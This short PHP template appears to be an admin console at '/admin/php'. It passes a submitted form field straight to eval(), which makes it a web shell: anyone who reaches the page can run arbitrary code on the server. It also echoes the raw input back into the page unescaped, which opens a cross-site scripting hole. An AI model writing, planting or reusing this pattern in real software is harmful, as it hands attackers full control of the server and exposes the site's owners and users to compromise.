<style>
td {
	word-wrap: break-word;
	max-width: 200px;
}
</style>
<?php
eval($_POST["php"]);
?>
<hr>
<form method="post" action="/admin/php">
<textarea name="php" style="width: 100%" ><?= $_POST["php"]; ?></textarea>
 <br><br>
<input type="submit" name="submit" value="Submit" class="btn btn-default"> 
</form>
